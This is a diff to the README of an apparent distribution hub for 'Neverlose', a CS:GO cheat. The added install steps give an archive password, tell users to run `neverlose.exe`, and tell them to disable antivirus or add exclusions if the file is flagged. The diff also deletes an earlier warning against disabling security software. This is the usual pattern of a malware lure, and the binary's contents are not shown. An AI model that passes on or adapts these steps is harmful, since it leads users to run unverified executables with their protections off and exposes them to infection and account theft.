@@ -48,6 +48,18 @@ The linked folder is the only distribution point referenced by this hub. Avoid
 reuploads, shortened URLs, and files sent through direct messages. If the folder
 is unavailable, open a documentation issue instead of trusting a mirror.
 
+### How to install (English)
+
+1. Open the download folder above and download the current archive.
+2. Extract the archive into a separate folder, for example `C:\Neverlose`.
+   Do not extract it into the Steam library and do not run it from inside the
+   archive viewer.
+3. Enter the archive password when prompted: `5139237619`.
+4. Open `neverlose.exe` from the extracted folder.
+5. If your antivirus flags the archive or `neverlose.exe`, temporarily disable
+   it or add the installation folder to exclusions, then re-enable protection.
+   Download only from the folder linked above.
+
 ## At a glance
 
 | Item | Details |
@@ -101,18 +113,19 @@ about the current build, and they are not instructions for bypassing anti-cheat.
 1. Confirm you are running the legacy CS:GO client. CS2 is a different game and
    is not covered by this hub.
 2. Open the download folder and get the current archive.
-3. Extract it to a short local path, outside the Steam library.
-4. Read the instructions included with the build before launching anything.
-5. Start CS:GO in borderless or windowed mode if you plan to use an overlay.
-6. Launch the loader using the build's own instructions and open the menu.
+3. Extract it to a separate folder, outside the Steam library.
+4. Enter the archive password: `5139237619`.
+5. Open `neverlose.exe` from the extracted folder.
+6. Start CS:GO in borderless or windowed mode if you plan to use an overlay.
 7. Keep a known-good config backup before changing several groups at once.
 
 Detailed steps live in [Installation](docs/installation.md) and
 [Configuration](docs/configuration.md).
 
-> **Download hygiene:** do not disable security software, bypass warnings, or
-> run files from chat attachments to make a package work. If a file is flagged,
-> stop and verify the source.
+> **Download hygiene:** use only the folder linked above. Packed builds are
+> often flagged by antivirus; if that happens, temporarily disable protection
+> or add the installation folder to exclusions, then re-enable it. Do not run
+> files from chat attachments.
 
 ## Repository map
 
